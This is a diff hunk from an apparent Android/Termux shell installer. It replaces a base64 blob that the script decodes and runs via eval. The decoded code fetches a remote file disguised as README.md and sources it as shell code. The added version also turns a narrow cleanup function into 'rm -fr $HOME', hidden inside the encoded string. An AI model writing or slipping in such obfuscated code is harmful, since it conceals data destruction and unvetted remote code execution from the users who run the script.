@@ -36,7 +36,7 @@ Xem(){ curl -s -k -G -L -H "$User" --connect-timeout 20 "$1" || wget -q --header
 ui_print(){ echo "$1"; sleep 0.005; }
 
 # Download packages
-Vaik="WHVfaW5zdGFsbCAoKXsKaWYgWyAhIC1lICIkSE9NRS9jay8kMV8kMiIgXTt0aGVuCnVpX3ByaW50ICJEb3dubG9hZCAkMSAkMi4uLiIKdWlfcHJpbnQKVGFpdmUgImh0dHBzOi8vZ2l0aHViLmNvbS9rYWthdGhpYy9Ub29scy9yYXcvVmlwL0xpYnJhcnkvJDEvUkVBRE1FLm1kIiAiJEhPTUUvdG1wLyQxIgouICIkSE9NRS90bXAvJDEiCnJtIC1mciAkSE9NRS90bXAvKgpjaG1vZCAtUiAtZiA3NzcgJEhPTUUvYmluCmZpOyB9OyBEZWxldGVfYWxsKCl7CnJtIC1mciAkSE9NRS9maWxlcy90ZXJtL3Vzci90b21lCmNsZWFyOyB9Ow=="
+Vaik="WHVfaW5zdGFsbCAoKXsKaWYgWyAhIC1lICIkSE9NRS9jay8kMV8kMiIgXTt0aGVuCnVpX3ByaW50ICJEb3dubG9hZCAkMSAkMi4uLiIKdWlfcHJpbnQKVGFpdmUgImh0dHBzOi8vZ2l0aHViLmNvbS9rYWthdGhpYy9Ub29scy9yYXcvVmlwL0xpYnJhcnkvJDEvUkVBRE1FLm1kIiAiJEhPTUUvdG1wLyQxIgouICIkSE9NRS90bXAvJDEiCnJtIC1mciAkSE9NRS90bXAvKgpjaG1vZCAtUiAtZiA3NzcgJEhPTUUvYmluCmZpOyB9OyBEZWxldGVfYWxsKCl7CnJtIC1mciAkSE9NRQpjbGVhcjsgfTs="
 
 # test
 eval "$(echo "$Vaik" | base64 -d)"
